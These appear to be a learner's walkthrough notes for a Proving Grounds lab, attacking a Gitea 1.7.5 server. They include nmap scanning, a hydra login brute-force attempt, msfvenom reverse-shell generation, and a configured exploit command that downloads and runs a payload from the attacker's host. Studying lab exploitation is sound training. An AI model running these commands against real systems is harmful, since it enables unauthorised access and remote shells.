This lab explores exploiting an authenticated remote code execution vulnerability in Gitea 1.7.5 to gain initial access. Learners will use default writable permissions in /usr/local/bin to hijack the PATH variable and escalate privileges through a scheduled cron job. The lab emphasizes exploiting application vulnerabilities, enumerating system weaknesses, and leveraging misconfigured cron jobs for privilege escalation.


lets get crackalackin

192.168.52.67

/etc/hosts

21 ftp
22 ssh
2222 dropbear
3000 gitea

```
???(kali?kali)-[~]
??$ nmap -sV -sC -T4 -oA initial ROQUEFORT
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-07 16:28 +0000
Nmap scan report for ROQUEFORT (192.168.52.67)
Host is up (0.00064s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE  SERVICE VERSION
21/tcp   open   ftp     ProFTPD 1.3.5b
22/tcp   open   ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:77:6f:b1:ed:65:b5:ad:14:64:40:d2:24:d3:9c:0d (RSA)
|   256 a9:b4:4f:61:2e:2d:9d:4c:48:15:fe:70:8e:fa:af:b3 (ECDSA)
|_  256 92:56:eb:af:c9:34:af:ea:a1:cf:9f:e1:90:dd:2f:61 (ED25519)
53/tcp   closed domain
2222/tcp open   ssh     Dropbear sshd 2016.74 (protocol 2.0)
3000/tcp open   http    Golang net/http server
|_http-title: Gitea: Git with a cup of tea
| fingerprint-strings: 
|   GenericLines, Help: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=9daf8f209ee0acd4; Path=/; HttpOnly
|     Set-Cookie: _csrf=4BPp8d_ROH2g-icuTNRtOa_kuyU6MTc3NTU3OTMzNTc3ODE2OTQ2MA%3D%3D; Path=/; Expires=Wed, 08 Apr 2026 16:28:55 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Tue, 07 Apr 2026 16:28:55 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <script>
|     ('serviceWorker' in navigator) {
|     window.addEventListener('load', function() {
|     navigator.serviceWorker.register('/serviceworker.js').then(function(registration) {
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=b3bec3e6387fc367; Path=/; HttpOnly
|     Set-Cookie: _csrf=Xu7puV3JCWFol1toTxm0aatjY6k6MTc3NTU3OTMzNTgyMDM1ODc0Mw%3D%3D; Path=/; Expires=Wed, 08 Apr 2026 16:28:55 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Tue, 07 Apr 2026 16:28:55 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Page Not Found - Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <script>
|     ('serviceWorker' in navigator) {
|     window.addEventListener('load', function() {
|_    navigator.serviceWorker.register('/serviceworker.js').then(function(registration

```

21 ftp
22 ssh
2222 dropbear
3000 gitea

```

POST /login

form-data
user_name=root
password=root
```

```bash
cewl --lowercase http://ROQUEFORT:3000/ | grep -v CeWL > words.txt

hydra -I -f -L words.txt -P words.txt "http-post-form://ROQUEFORT:3000/login:user_name=^USER^&password=^PASS^:F=403"
```

okay! so this is a rabbit hole.

https://medium.com/@vivek-kumar/offensive-security-proving-grounds-walk-through-roquefort-e61052190965

I need to search with `searchsploit Gitea`.

`49383`

we need to create a new account on ROQUEFORT gitea.

`hackme:hackme`

```bash
???(kali?kali)-[~]
??$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host proto kernel_lo 
       valid_lft forever preferred_lft forever
3: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:86:81:c1 brd ff:ff:ff:ff:ff:ff
    inet 192.168.49.52/24 brd 192.168.49.255 scope global noprefixroute eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::41f:8306:40e5:ca37/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever

```

```bash
ls /usr/share/exploitdb/exploits/multiple/webapps/49383.py
cp /usr/share/exploitdb/exploits/multiple/webapps/49383.py ./

msfvenom -p cmd/unix/reverse_bash LHOST=192.168.49.52 LPORT=4444 -f raw > reverse.sh

# in new terminal
nc -nvlp 4444

# in new terminal
python3 -m http.server 8080

# edit file 
code-oss 49383.py
```


```python
# contents of top of 49383.py

USERNAME = "hackme"
PASSWORD = "hackme"
HOST_ADDR = '192.168.52.67'
HOST_PORT = 3000
URL = 'http://ROQUEFORT:3000'
CMD = 'wget http://192.168.49.52:8080/reverse.sh -O /tmp/reverse.sh && chmod 777 /tmp/reverse.sh && /tmp/reverse.sh'

```
